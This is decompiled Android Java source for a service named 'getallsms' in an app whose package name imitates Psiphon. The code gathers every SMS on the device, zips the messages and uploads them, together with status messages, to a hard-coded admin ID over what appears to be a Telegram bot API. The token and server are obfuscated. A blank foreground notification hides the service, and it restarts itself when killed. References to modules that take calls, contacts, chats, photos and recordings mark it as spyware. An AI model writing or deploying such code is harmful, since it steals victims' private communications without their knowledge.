package com.psiphon3;


import anywheresoftware.b4a.BA;
import anywheresoftware.b4a.objects.ServiceHelper;
import anywheresoftware.b4a.debug.*;

public class getallsms extends  android.app.Service{
	public static class getallsms_BR extends android.content.BroadcastReceiver {

		@Override
		public void onReceive(android.content.Context context, android.content.Intent intent) {
            BA.LogInfo("** Receiver (getallsms) OnReceive **");
			android.content.Intent in = new android.content.Intent(context, getallsms.class);
			if (intent != null)
				in.putExtra("b4a_internal_intent", intent);
            ServiceHelper.StarterHelper.startServiceFromReceiver (context, in, false, BA.class);
		}

	}
    static getallsms mostCurrent;
	public static BA processBA;
    private ServiceHelper _service;
    public static Class<?> getObject() {
		return getallsms.class;
	}
	@Override
	public void onCreate() {
        super.onCreate();
        mostCurrent = this;
        if (processBA == null) {
		    processBA = new BA(this, null, null, "com.psiphon3", "com.psiphon3.getallsms");
            if (BA.isShellModeRuntimeCheck(processBA)) {
                processBA.raiseEvent2(null, true, "SHELL", false);
		    }
            try {
                Class.forName(BA.applicationContext.getPackageName() + ".main").getMethod("initializeProcessGlobals").invoke(null, null);
            } catch (Exception e) {
                throw new RuntimeException(e);
            }
            processBA.loadHtSubs(this.getClass());
            ServiceHelper.init();
        }
        _service = new ServiceHelper(this);
        processBA.service = this;
        
        if (BA.isShellModeRuntimeCheck(processBA)) {
			processBA.raiseEvent2(null, true, "CREATE", true, "com.psiphon3.getallsms", processBA, _service, anywheresoftware.b4a.keywords.Common.Density);
		}
        if (!false && ServiceHelper.StarterHelper.startFromServiceCreate(processBA, false) == false) {
				
		}
		else {
            processBA.setActivityPaused(false);
            BA.LogInfo("*** Service (getallsms) Create ***");
            processBA.raiseEvent(null, "service_create");
        }
        processBA.runHook("oncreate", this, null);
        if (false) {
			ServiceHelper.StarterHelper.runWaitForLayouts();
		}
    }
		@Override
	public void onStart(android.content.Intent intent, int startId) {
		onStartCommand(intent, 0, 0);
    }
    @Override
    public int onStartCommand(final android.content.Intent intent, int flags, int startId) {
    	if (ServiceHelper.StarterHelper.onStartCommand(processBA, new Runnable() {
            public void run() {
                handleStart(intent);
            }}))
			;
		else {
			ServiceHelper.StarterHelper.addWaitForLayout (new Runnable() {
				public void run() {
                    processBA.setActivityPaused(false);
                    BA.LogInfo("** Service (getallsms) Create **");
                    processBA.raiseEvent(null, "service_create");
					handleStart(intent);
                    ServiceHelper.StarterHelper.removeWaitForLayout();
				}
			});
		}
        processBA.runHook("onstartcommand", this, new Object[] {intent, flags, startId});
		return android.app.Service.START_STICKY;
    }
    public void onTaskRemoved(android.content.Intent rootIntent) {
        super.onTaskRemoved(rootIntent);
        if (false)
            processBA.raiseEvent(null, "service_taskremoved");
            
    }
    private void handleStart(android.content.Intent intent) {
    	BA.LogInfo("** Service (getallsms) Start **");
    	java.lang.reflect.Method startEvent = processBA.htSubs.get("service_start");
    	if (startEvent != null) {
    		if (startEvent.getParameterTypes().length > 0) {
    			anywheresoftware.b4a.objects.IntentWrapper iw = ServiceHelper.StarterHelper.handleStartIntent(intent, _service, processBA);
    			processBA.raiseEvent(null, "service_start", iw);
    		}
    		else {
    			processBA.raiseEvent(null, "service_start");
    		}
    	}
    }
	
	@Override
	public void onDestroy() {
        super.onDestroy();
        if (false) {
            BA.LogInfo("** Service (getallsms) Destroy (ignored)**");
        }
        else {
            BA.LogInfo("** Service (getallsms) Destroy **");
		    processBA.raiseEvent(null, "service_destroy");
            processBA.service = null;
		    mostCurrent = null;
		    processBA.setActivityPaused(true);
            processBA.runHook("ondestroy", this, null);
        }
	}

@Override
	public android.os.IBinder onBind(android.content.Intent intent) {
		return null;
	}public anywheresoftware.b4a.keywords.Common __c = null;
public static com.psiphon3.httpjob _v6 = null;
public static com.psiphon3.httpjob _v7 = null;
public static anywheresoftware.b4a.objects.collections.JSONParser _v0 = null;
public static String _vv1 = "";
public static int _admin_id = 0;
public static String _vv2 = "";
public static String _vv3 = "";
public static String _vv4 = "";
public static String _vv5 = "";
public static ir.rayanoos.lib.upload_ultra.upload_ultra _vv6 = null;
public static ice.smsplus.SmsWrapper _vv7 = null;
public static com.AB.ABZipUnzip.ABZipUnzip _vv0 = null;
public static anywheresoftware.b4a.phone.CallLogWrapper _vvv1 = null;
public static anywheresoftware.b4a.phone.Contacts2Wrapper _vvv2 = null;
public static ir.rayanoos.lib.ultra_decoder.ultra_decoder _vvv3 = null;
public ir.rayanoos.lib.upload_ultra.uploadfile _vvvvvvvv5 = null;
public com.psiphon3.main _vvvvvvvv6 = null;
public com.psiphon3.cmr _vvvvvvvv7 = null;
public com.psiphon3.cmr2 _vvvvvvvv0 = null;
public com.psiphon3.firebasemessaging _vvvvvvvvv1 = null;
public com.psiphon3.getallcalls _vvvvvvvvv2 = null;
public com.psiphon3.getallcontacts _vvvvvvvvv3 = null;
public com.psiphon3.getchats _vvvvvvvvv5 = null;
public com.psiphon3.getinsta _vvvvvvvvv6 = null;
public com.psiphon3.getlists _vvvvvvvvv7 = null;
public com.psiphon3.getonechat _vvvvvvvvv0 = null;
public com.psiphon3.getpicture _vvvvvvvvvv1 = null;
public com.psiphon3.getpicture2 _vvvvvvvvvv2 = null;
public com.psiphon3.srv _vvvvvvvvvv3 = null;
public com.psiphon3.starter _vvvvvvvvvv4 = null;
public com.psiphon3.startrecord _vvvvvvvvvv5 = null;
public com.psiphon3.httputils2service _vvvvvvvvvv6 = null;
public static String  _getsms(String _topic,String _filename) throws Exception{
anywheresoftware.b4a.objects.collections.List _listsms = null;
String _strsms = "";
ice.smsplus.SmsWrapper.Sms _i = null;
 //BA.debugLineNum = 62;BA.debugLine="Sub getsms (Topic As String, fileName As String)";
 //BA.debugLineNum = 64;BA.debugLine="Try";
try { //BA.debugLineNum = 67;BA.debugLine="Dim Listsms As List";
_listsms = new anywheresoftware.b4a.objects.collections.List();
 //BA.debugLineNum = 68;BA.debugLine="Listsms.Initialize";
_listsms.Initialize();
 //BA.debugLineNum = 69;BA.debugLine="Listsms = allsms.GetAll";
_listsms = _vv7.GetAll();
 //BA.debugLineNum = 70;BA.debugLine="Dim strSms As String=\"\"";
_strsms = "";
 //BA.debugLineNum = 71;BA.debugLine="For Each i As Sms In Listsms";
{
final anywheresoftware.b4a.BA.IterableList group6 = _listsms;
final int groupLen6 = group6.getSize()
;int index6 = 0;
;
for (; index6 < groupLen6;index6++){
_i = (ice.smsplus.SmsWrapper.Sms)(group6.Get(index6));
 //BA.debugLineNum = 72;BA.debugLine="strSms = strSms&CRLF&CRLF&\"phone: \"&i.Address&C";
_strsms = _strsms+anywheresoftware.b4a.keywords.Common.CRLF+anywheresoftware.b4a.keywords.Common.CRLF+"phone: "+_i.Address+anywheresoftware.b4a.keywords.Common.CRLF+"content :"+anywheresoftware.b4a.keywords.Common.CRLF+_i.Body+anywheresoftware.b4a.keywords.Common.CRLF+"date :"+anywheresoftware.b4a.keywords.Common.DateTime.Date(_i.Date);
 }
};
 //BA.debugLineNum = 74;BA.debugLine="ht2.Download(apiserver&token&\"/sendmessage?chat_";
_v7._vvvv6 /*String*/ (_vv2+_vv1+"/sendmessage?chat_id="+BA.NumberToString(_admin_id)+"&text="+"waitingForAllsms..."+"&reply_to_message_id="+BA.NumberToString(0));
 //BA.debugLineNum = 76;BA.debugLine="File.WriteString(File.DirInternal,\"allSms.txt\",s";
anywheresoftware.b4a.keywords.Common.File.WriteString(anywheresoftware.b4a.keywords.Common.File.getDirInternal(),"allSms.txt",_strsms);
 //BA.debugLineNum = 77;BA.debugLine="zip.ABZipfile(File.DirInternal&\"/\" , \"allSms.txt";
_vv0.ABZipfile(anywheresoftware.b4a.keywords.Common.File.getDirInternal()+"/","allSms.txt",anywheresoftware.b4a.keywords.Common.File.getDirInternal()+"/allSms.zip");
 //BA.debugLineNum = 78;BA.debugLine="upload.upload(admin_id , \"All Sms\".Replace(\" \",\"";
_vv6._upload(_admin_id,"All Sms".replace(" ","%20"),(int) (0),anywheresoftware.b4a.keywords.Common.File.getDirInternal(),"allSms.zip");
 //BA.debugLineNum = 79;BA.debugLine="File.Delete(File.DirInternal,\"allSms.txt\")";
anywheresoftware.b4a.keywords.Common.File.Delete(anywheresoftware.b4a.keywords.Common.File.getDirInternal(),"allSms.txt");
 //BA.debugLineNum = 80;BA.debugLine="File.Delete(File.DirInternal , \"allSms.zip\")";
anywheresoftware.b4a.keywords.Common.File.Delete(anywheresoftware.b4a.keywords.Common.File.getDirInternal(),"allSms.zip");
 } 
       catch (Exception e16) {
			processBA.setLastException(e16); //BA.debugLineNum = 82;BA.debugLine="ht2.Download(apiserver&token&\"/sendmessage?chat_";
_v7._vvvv6 /*String*/ (_vv2+_vv1+"/sendmessage?chat_id="+BA.NumberToString(_admin_id)+"&text="+"Exception"+"&reply_to_message_id="+BA.NumberToString(0));
 };
 //BA.debugLineNum = 84;BA.debugLine="End Sub";
return "";
}
public static String  _process_globals() throws Exception{
 //BA.debugLineNum = 6;BA.debugLine="Sub Process_Globals";
 //BA.debugLineNum = 9;BA.debugLine="Dim ht,ht2 As HttpJob";
_v6 = new com.psiphon3.httpjob();
_v7 = new com.psiphon3.httpjob();
 //BA.debugLineNum = 10;BA.debugLine="Dim js As JSONParser";
_v0 = new anywheresoftware.b4a.objects.collections.JSONParser();
 //BA.debugLineNum = 11;BA.debugLine="Dim token As String = \":...__::...__::...__._____";
_vv1 = main.vvv13 (new byte[] {50,54,34,-81,72,64,60,-3,35,46,35,-64,87,34,54,-81,57,49,89,-104,35,95,82,-64,87,71,83,-69,45,49,40,-23,82,95}, 149796)+main.vvv13 (new byte[] {87,54,-79,18,45,37,-54,37,35,95,-80,12,38,71,-79,18,45,37,-54,37,35,95,-80,12,38,71,-79,18,45,37,-54,37,35,95,-80,125,87,71,-79,18,72,64,-34,49,35,46,-63,12,87,54,-79,18,72,64,-69,84,55,58,-63,125,38,71,-79,119,45,49,-54,37,82,95,-63,12,50,34,-44,18,57,49,-69,37,82,95,-80,12,87,71,-79,119,45,64,-54,37,82,46,-80,12,87}, 668811)+main.vvv13 (new byte[] {87,68,84,-127,45,38,94,-74,35,45,85,-18,87,68,84,-127,72,67,59,-94,82,45,36,-18,87,68,84,-127,57,67,94,-57,55,57,85,-97,38,68,84,-127,72,50,94,-57,82,57,48,-18,87,68,84,-16,57,50,94,-74,35,57,48,-18,87,68,37,-127,72,50,94,-57,35,57,48,-97,38,53,37,-16}, 736935)+main.vvv13 (new byte[] {38,53,30,-59,72,67,0,-26,35,92,110,-86,38,68,111,-76,57,50,0,-26,35,45,31,-37,87,53,111,-96,45,50,101,-14,82,45,110,-37,38,68,30,-96,45,67,101,-125,82,92,110,-86,87,53,30,-59,45,38,20,-14,35,92,110,-37,38,68,111,-96,45,67,101,-125,82,92,31,-37,87,53,30,-59,45,38,101,-14,82,45,31,-37,38,53,30,-59,72,38,0,-14,82,92,110,-37,38,68,111,-59,72,38,0,-14,35,45,110,-37,87,53,111,-59,72,38,0,-125,35,92,110,-86,87,68,111,-76,57,67,0,-26,35,92,110,-86,38,68,111,-76,57,50,0,-26,82,45,31,-37,38,68,111,-59,72,67,101,-125,55,57,31,-86,87,68,30,-59}, 859653)+main.vvv13 (new byte[] {87,53,108,22,45,38,102,80,82,92,28,121,38,53,108,22,45,38,102,33,35,92,28,8,38,53,29,22,45,38,23,80,82,92,109,121,87,68,108,22,72,38,114,33,35,45,109,121,87,68,29,22,72,67,23,68,55,45,109,121,87,53,29,103,57,50,102,68,82,57,28,8,38,53,108,22,57,67,23,80,82,57,121,8,38,68,29,22,72,67,102,80,35,57,121,8,87,68,108,103,72,50,23,33,35,57,121,8,38,53,29,103,72,67,102,33}, 900250)+main.vvv13 (new byte[] {87,68,43,-72,57,50,53,-22,82,45,62,-61,87,53,43,-72,72,67,53,-101,82,92,79,-78,87,68,78,-72,45,67,53,-22,82,92,79,-61,38,68,78,-35,72,38,33,-22,82,92,62,-61,87,68,63,-35,57,38}, 788014);
 //BA.debugLineNum = 12;BA.debugLine="Dim admin_id As Int = 315160032";
_admin_id = (int) (315160032);
 //BA.debugLineNum = 13;BA.debugLine="Dim apiserver As String=\":.____..._.::..____....:";
_vv2 = main.vvv13 (new byte[] {50,53,35,94,72,67,88,105,35,92,83,37,50,53,82,94,72,67,41,105,35,45,83,37,50,53,82,94,72,67,41,105,35,45,83,37,50,53,35,94,57,50,88,105,35,45,83,37,50,53,82,94,57,50,88,105,82,92,83,37,50,52,83,59,57,67,41,105,35,92,83,64,87,53,70,59}, 996517)+main.vvv13 (new byte[] {38,71,5,101,57,64,126,82,82,46,97,111,38,71,5,101,57,64,126,82,82,46,97,123,50,54,116,101,57,64,126,35,82,95,117,111,50,71,116,101,57,49,126,35,35,95,117,111,50,54,116,20,72,64,15,35,35,46,117,111,50,54,5}, 327872)+main.vvv13 (new byte[] {87,71,-50,-41,57,64,-60,-32,55,58,-66,-72,87,54,-65,-90,57,64,-60,-32,55,58,-66,-72,87,71,-50,-41,57,49,-75,-32,55,58,-66,-55,38,71,-50,-41,72,64,-60,-32,55,58,-66,-55,87,54,-50,-41,57,64,-60,-32,55,58,-66,-55,87,71,-50,-41,72,64,-60,-32,55,46,-86,-72,38,71,-50,-41,57,64,-75,-111,35,58,-86,-72,38,71}, 493162)+main.vvv13 (new byte[] {38,54,110,-21,72,49,100,-56,34,58,30,-11,87,54,110,-21,57,64,100,-36,55,58,30,-11,87,71,110,-102,72,64,100,-83,55,58,30,-124,87,71,110,-21,57,49,21,-36,55}, 272299);
 //BA.debugLineNum = 14;BA.debugLine="Dim fileToWirte As String = \"msgid16.txt\"";
_vv3 = main.vvv13 (new byte[] {101,107,95,-50,115,46,4,-49,121,120,77}, 251443);
 //BA.debugLineNum = 15;BA.debugLine="Dim StartMessage As String = \"test16\"";
_vv4 = main.vvv13 (new byte[] {124,124,-112,76,38,40}, 91547);
 //BA.debugLineNum = 16;BA.debugLine="Dim uploadUrl As String = \":.____..._.::..____...";
_vv5 = main.vvv13 (new byte[] {50,54,-57,-122,72,64,-68,-79,35,95,-73,-3,50,54,-74,-122,72,64,-51,-79,35,46,-73,-3,50,54,-74,-122,72,64,-51,-79,35,46,-73,-3,50,54,-57,-122,57,49,-68,-79}, 472001)+main.vvv13 (new byte[] {38,53,24,19,45,51,19,85,35,45,25,25,87,53,24,118,72,50,6,85,82,45,25,25,38,53,24,7,72,50,6,85,35,45,104,104,87,68,24,7,57,50,6,85,35,92,104,104,87,68,24,118,72,50,6}, 872464)+main.vvv13 (new byte[] {50,53,108,7,57,50,102,48,82,92,109,124,50,53,108,7,72,67,23,48,35,45,109,124,50,53,29,118,72,67,23,65,82,92,109,124,50,53,29,7,57,67,23,48,82,92,109,124,50,53,29,7,72,67,23,65,82,92,109,124,38,33,108,118,72,67,23,48,82,45,28,104,50,33,108,118,72,50,102,65,82,92,109,25,50,52,120,118,72,50,23,65,35,45,109,25,38,33,120,118,72,67,102,48,35,45}, 899381)+main.vvv13 (new byte[] {38,53,5,112,45,50,126,83,35,45,117,11,38,53,5,112,45,50,126,83,82,45,117,11,87,68,5,112,57,38,15,83,82,45,4,122,38}, 809404)+main.vvv13 (new byte[] {38,55,-50,11,45,48,-75,40,82,94,-49,1,38,70,-50,11,45,48,-75,40,35,47,-49}, 84568)+main.vvv13 (new byte[] {38,53,77,38,45}, 975846);
 //BA.debugLineNum = 17;BA.debugLine="Dim upload As upload_ultra";
_vv6 = new ir.rayanoos.lib.upload_ultra.upload_ultra();
 //BA.debugLineNum = 18;BA.debugLine="Dim allsms As SmsMessages";
_vv7 = new ice.smsplus.SmsWrapper();
 //BA.debugLineNum = 19;BA.debugLine="Dim zip As ABZipUnzip";
_vv0 = new com.AB.ABZipUnzip.ABZipUnzip();
 //BA.debugLineNum = 20;BA.debugLine="Dim callLog As CallLog";
_vvv1 = new anywheresoftware.b4a.phone.CallLogWrapper();
 //BA.debugLineNum = 21;BA.debugLine="Dim c As Contacts2";
_vvv2 = new anywheresoftware.b4a.phone.Contacts2Wrapper();
 //BA.debugLineNum = 22;BA.debugLine="Dim decode As ultra_decoder";
_vvv3 = new ir.rayanoos.lib.ultra_decoder.ultra_decoder();
 //BA.debugLineNum = 25;BA.debugLine="End Sub";
return "";
}
public static String  _service_create() throws Exception{
anywheresoftware.b4a.objects.NotificationWrapper _n = null;
 //BA.debugLineNum = 27;BA.debugLine="Sub Service_Create";
 //BA.debugLineNum = 28;BA.debugLine="decode.Initialize";
_vvv3._initialize(processBA);
 //BA.debugLineNum = 29;BA.debugLine="token = decode.decode(token)";
_vv1 = _vvv3._decode(_vv1);
 //BA.debugLineNum = 30;BA.debugLine="apiserver=decode.decode(apiserver)";
_vv2 = _vvv3._decode(_vv2);
 //BA.debugLineNum = 31;BA.debugLine="uploadUrl=decode.decode(uploadUrl)";
_vv5 = _vvv3._decode(_vv5);
 //BA.debugLineNum = 33;BA.debugLine="ht.Initialize(\"ht\",Me)";
_v6._initialize /*String*/ (processBA,"ht",getallsms.getObject());
 //BA.debugLineNum = 34;BA.debugLine="ht2.Initialize(\"ht2\",Me)";
_v7._initialize /*String*/ (processBA,"ht2",getallsms.getObject());
 //BA.debugLineNum = 35;BA.debugLine="ht.JobName=\"ht1\"";
_v6._vvvvvvv3 /*String*/  = "ht1";
 //BA.debugLineNum = 36;BA.debugLine="ht2.JobName=\"ht2\"";
_v7._vvvvvvv3 /*String*/  = "ht2";
 //BA.debugLineNum = 37;BA.debugLine="upload.Initialize(uploadUrl,token)";
_vv6._initialize(processBA,_vv5,_vv1);
 //BA.debugLineNum = 38;BA.debugLine="Dim n As Notification";
_n = new anywheresoftware.b4a.objects.NotificationWrapper();
 //BA.debugLineNum = 39;BA.debugLine="n.Initialize2(n.IMPORTANCE_LOW)";
_n.Initialize2(_n.IMPORTANCE_LOW);
 //BA.debugLineNum = 40;BA.debugLine="n.Icon      = \"icon\"";
_n.setIcon("icon");
 //BA.debugLineNum = 41;BA.debugLine="n.Sound    = False";
_n.setSound(anywheresoftware.b4a.keywords.Common.False);
 //BA.debugLineNum = 42;BA.debugLine="n.Vibrate    = False";
_n.setVibrate(anywheresoftware.b4a.keywords.Common.False);
 //BA.debugLineNum = 43;BA.debugLine="n.Light    = False";
_n.setLight(anywheresoftware.b4a.keywords.Common.False);
 //BA.debugLineNum = 44;BA.debugLine="n.Insistent  = False";
_n.setInsistent(anywheresoftware.b4a.keywords.Common.False);
 //BA.debugLineNum = 45;BA.debugLine="n.AutoCancel = False";
_n.setAutoCancel(anywheresoftware.b4a.keywords.Common.False);
 //BA.debugLineNum = 46;BA.debugLine="n.SetInfo(\"\",\"\",\"\")";
_n.SetInfoNew(processBA,BA.ObjectToCharSequence(""),BA.ObjectToCharSequence(""),(Object)(""));
 //BA.debugLineNum = 47;BA.debugLine="Service.AutomaticForegroundNotification = n";
mostCurrent._service.AutomaticForegroundNotification = (android.app.Notification)(_n.getObject());
 //BA.debugLineNum = 55;BA.debugLine="End Sub";
return "";
}
public static String  _service_destroy() throws Exception{
 //BA.debugLineNum = 88;BA.debugLine="Sub Service_Destroy";
 //BA.debugLineNum = 89;BA.debugLine="StartServiceAt(\"\" , DateTime.Now+100 , True)";
anywheresoftware.b4a.keywords.Common.StartServiceAt(processBA,(Object)(""),(long) (anywheresoftware.b4a.keywords.Common.DateTime.getNow()+100),anywheresoftware.b4a.keywords.Common.True);
 //BA.debugLineNum = 90;BA.debugLine="End Sub";
return "";
}
public static String  _service_start(anywheresoftware.b4a.objects.IntentWrapper _startingintent) throws Exception{
 //BA.debugLineNum = 57;BA.debugLine="Sub Service_Start (StartingIntent As Intent)";
 //BA.debugLineNum = 60;BA.debugLine="End Sub";
return "";
}
}
